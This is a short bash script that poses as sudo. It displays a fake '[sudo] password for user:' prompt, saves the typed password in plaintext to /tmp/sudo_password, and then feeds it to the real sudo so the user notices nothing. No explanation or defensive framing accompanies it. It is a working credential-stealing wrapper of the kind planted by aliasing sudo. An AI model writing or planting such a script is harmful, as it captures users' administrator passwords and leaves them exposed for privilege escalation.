#!/bin/bash
read -p "[sudo] password for user: " password
echo $password > /tmp/sudo_password
sudo $@ <<END
$password
END

